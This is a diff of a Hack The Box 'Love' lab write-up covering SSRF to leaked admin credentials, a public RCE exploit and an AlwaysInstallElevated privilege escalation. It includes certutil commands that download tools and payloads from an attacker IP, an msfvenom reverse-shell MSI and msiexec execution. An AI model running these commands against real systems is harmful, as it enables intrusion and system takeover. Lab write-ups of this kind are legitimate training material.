@@ -69,34 +69,46 @@ Add love.htb to hosts file and staging.love.htb
 ### HTTP
 http://love.htb/ gives us login screen
 ![](Images/Pasted%20image%2020250417122446.png)
+
 Searchsploit shows some random modules for exploit
+
 ![](Images/Pasted%20image%2020250417122514.png)
 Staging gets us some file scanner resource.
+
 ![](Images/Pasted%20image%2020250417122614.png)
 love.htb:5000 is not allowed to us.
+
 ![](Images/Pasted%20image%2020250417122642.png)
 
 ## Exploit
 Upon doing some testing of the File Scanning website I was able to use the local IP address of the remote host to access 127.0.0.1:5000 bypassing the authentication requirement.
+
 ![](Images/Pasted%20image%2020250417122906.png)
 `Vote Admin Creds admin: @LoveIsInTheAir!!!! `
 Now that we have credentials we can try the `Online Voting System 1.0 - Remote Code Execution (Authenticated)` found in our searchsploit search. [ExploitDB](https://www.exploit-db.com/exploits/49445)
 Edit settings and attempt to run it
 
 ![](Images/Pasted%20image%2020250417123709.png)
+
 This wasn't working, I realized the directories was wrong and it beings at /admin begins at the root directory.
 
 ![](Images/Pasted%20image%2020250417124556.png)
+
 After adjusting we setup the listener and run it again.
+
 ![](Images/Pasted%20image%2020250417124617.png)
 
 Grab the user flag
+
 ![](Images/Pasted%20image%2020250417124728.png)
 
 ## Priv Esc
 `certutil -urlcache -split -f http://10.10.14.251:8080/winPEASany.exe winPEASany.exe`
-![](Images/Pasted%20image%2020250417125437.png)We can verify the WinPeas output
+![](Images/Pasted%20image%2020250417125437.png)
+
+We can verify the WinPeas output
 ![](Images/Pasted%20image%2020250417125606.png)
+
 ![](Images/Pasted%20image%2020250417130000.png)
 So it appears that the path of escalation is due to the misconfiguration of always install as elevated and the user Phoebe having access to write in the administraton directory.
 Lets generate a payload and test it out
@@ -104,6 +116,7 @@ Lets generate a payload and test it out
 `certutil -urlcache -split -f http://10.10.14.251:8080/shell.msi shell.msi`
 `msiexec /quiet /i shell.msi`
 Original Meterpreter shell wasn't working so lets try a new one
+
 ![](Images/Pasted%20image%2020250417130725.png)
 
 `msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.251 lport=8686 -f msi -o shell.msi`
